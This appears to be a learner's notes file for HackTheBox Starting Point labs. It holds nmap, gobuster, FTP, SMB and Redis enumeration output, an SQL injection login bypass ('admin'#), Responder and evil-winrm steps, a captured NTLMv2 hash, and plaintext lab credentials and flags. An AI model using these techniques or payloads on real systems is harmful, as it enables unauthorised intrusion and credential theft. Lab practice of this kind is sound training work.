# HackTheBox Useful Stuff

- [Introduction to Lab Access](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access)

# starting-point 

## Tier 0

### Meow

- If you want to log in through telnet with a blank password, use `root`.
- telnet is 23/tcp

### Fawn

- FTP is 20/21
- to use nmap effectively, you can see the version of differing things with -sV, so `nmap -sV $T_IP`
- ftp login without an account use `anonymous` as the user

```
ftp $T_IP 
Connected to 10.129.253.238.
220 (vsFTPd 3.0.3)
Name (10.129.253.238:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> cat flag.txt
?Invalid command
ftp> GET flag.txt
?Invalid command
ftp> dir flag.txt
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> put flag.txt flag.txty
local: flag.txt remote: flag.txty
local: flag.txt: No such file or directory
ftp> put flag.txt flag.txt
local: flag.txt remote: flag.txt
local: flag.txt: No such file or directory
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (18.7238 kB/s)
ftp> exit
221 Goodbye.
```

### Dancing
               
               
```
nmap -sV $T_IP 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-14 13:20 EDT
Nmap scan report for 10.129.15.69
Host is up (0.046s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
```

- `smbclient -L $T_IP` to see the shares that are available
- `smbclient \\\\$T_IP\\WorkShares` to access WorkShares


## Redeemer

- `redis-cli -h $T_IP` to access the redis
- SELECT to select database, with 16 being the normal with the first one being 0.
- KEYS * to see every key that it has
- INFO to see info about the database
- https://www.tutorialspoint.com/redis/redis_keys.htm#


## Tier 1

### Appointment

- SQL Injection
- Didn't find anything with GoBuster
- But found the index site etc etc, and inputted `admin'#` to get access to the admin user


### Sequel


- nmap $T_IP 
```                                                                                               130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-15 03:30 EDT
Nmap scan report for 10.129.228.168
Host is up (0.045s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
```

- nmap -sC -sV -p 3306 $T_IP

- https://www.mysqltutorial.org/mysql-cheat-sheet.aspx

```
SHOW DATABASES;
USE htb;
SHOW TABLES;
SELECT * FROM config;
```
---------------------------------------------------------

```
SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.044 sec)
```

### Crocodile

- nmap -sC -sV $T_IP

```
nmap -sC -sV $T_IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 03:52 EDT
Nmap scan report for 10.129.112.26
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
```
- ftp $T_IP

GOBUSTER

```
gobuster dir -u $T_IP -w common.txt       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.112.26
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/15 03:58:27 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.129.112.26/assets/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.112.26/css/]   
/dashboard            (Status: 301) [Size: 318] [--> http://10.129.112.26/dashboard/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.112.26/fonts/]    
/index.html           (Status: 200) [Size: 58565]                                    
/js                   (Status: 301) [Size: 311] [--> http://10.129.112.26/js/]       
/server-status        (Status: 403) [Size: 278]                                      
                                                                                     
===============================================================
2022/06/15 03:58:48 Finished
===============================================================
```
- Dashboard, use the found login information for admin on it and you're in.

### Responder

- nmap -p- -T5 $T_IP  

```
nmap -p- -T5 $T_IP                                                                                        130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 04:10 EDT
Nmap scan report for 10.129.225.41
Host is up (0.045s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 85.55 seconds
```

- git clone https://github.com/lgandx/Responder
- vil-winrm -i $T_IP -u administrator -p badminton 

### Archetype

- mbclient -N -L $T_IP 

```
cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

M3g4c0rp123

```
sql_svc::ARCHETYPE:585e774f5426ef44:9E1507CD71E9092807E81FAE9886B6CF:01010000000000008013CAAC9080D801960D472E2713886F00000000020008004D00390053004D0001001E00570049004E002D003800490034004100360049004100430046004800460004003400570049004E002D00380049003400410036004900410043004600480046002E004D00390053004D002E004C004F00430041004C00030014004D00390053004D002E004C004F00430041004C00050014004D00390053004D002E004C004F00430041004C00070008008013CAAC9080D801060004000200000008003000300000000000000000000000003000009FFCD0055267B9295BE1495FFAA98ED6F4376462BFFC99114A76222DA703ABE30A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0036000000000000000000  
```

- 3e7b102e78218e935bf3f4951fec21a3

```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```


### Oopsie

- All this stuff
- Using Burdpsuite
- got login info as a guest, looking for other info
  - 2	client	client@client.htb
  - 34322	admin	admin@megacorp.com
- 2-reverse-shell.php















---------------------------------------------------------------








